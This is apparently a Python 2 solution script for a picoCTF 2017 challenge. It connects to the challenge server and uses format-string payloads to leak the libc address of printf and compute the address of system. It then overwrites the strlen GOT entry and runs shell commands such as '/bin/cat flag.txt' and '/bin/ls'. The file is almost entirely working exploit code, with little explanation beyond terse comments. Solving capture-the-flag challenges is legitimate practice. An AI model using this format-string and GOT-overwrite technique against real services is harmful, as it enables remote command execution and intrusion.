import struct, time
from socket import *

def recv_timeout(the_socket,timeout=2):
    the_socket.setblocking(0)
    total_data=[];
    data='';
    begin=time.time()
    while 1:
        if total_data and time.time()-begin > timeout:
            break
        elif time.time()-begin > timeout*2:
            break
        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data)
                begin = time.time()
            else:
                time.sleep(0.1)
        except:
            pass
    the_socket.setblocking(1)
    return ''.join(total_data)

def indicator(exploit):
  return "ABCD"+exploit+"EFGH"

def value(reply):
  start = reply.index("ABCD")+4
  end = reply.index("EFGH")
  return reply[start:end]

s = socket(AF_INET, SOCK_STREAM)
s.connect(('shell2017.picoctf.com', 44887))

#PAYLOAD 1: Write PRINTF_PLT to a location
#134519023
exploit = "%134519023x%9$n"
s.send(exploit+'\n')
recv_timeout(s)
#print s.recv(4096)

#DEBUG 1: Read Written Data
exploit = indicator("%16$x")
s.send(exploit+'\n')
print value(s.recv(2048))
#Should print 0x08049970

#PAYLOAD 2: Get the 'printf' libc address
exploit = indicator("%16$s")
s.send(exploit+'\n')
data = value(s.recv(2048))
data = data[0:4]
printf_libc =''
for c in data:
  printf_libc = hex(ord(c))[2:] + printf_libc
print printf_libc

#Calculate base libc address
base_libc = int(printf_libc, 16) - 0x4cc70
print hex(base_libc)

#Calculate 'system' libc address
system_libc = base_libc + 0x3e3e0
print hex(system_libc)

#PAYLOAD 3: Write STRLEN_PLT to a location
#39151, 39155, 39167, 39171, 39179
exploit = "%39167x%9$hn"
s.send(exploit+'\n')
recv_timeout(s)
#print s.recv(4096)

#DEBUG 3: Read Written Data
exploit = indicator("%16$x")
s.send(exploit+'\n')
print value(s.recv(2048))
#Should print 0x804998c

#PAYLOAD 4: Overwrite the 'strlen' with 'system'
portion = system_libc // 10
remainder = system_libc % 10
exploit = "; /bin/cat flag.txt #"
exploit += ("%"+str(portion)+"x")*9
exploit += "%"+str(portion+remainder-150)+"x%16$n"
s.send(exploit+'\n')
data = recv_timeout(s)
print "".join(data.split())

#PAYLOAD 5: Execute shell commands
print "Sending Final Payload"
exploit = "; /bin/ls #"
s.send(exploit+'\n')
data = recv_timeout(s)
print "".join(data.split())
print "Completed"
s.close()
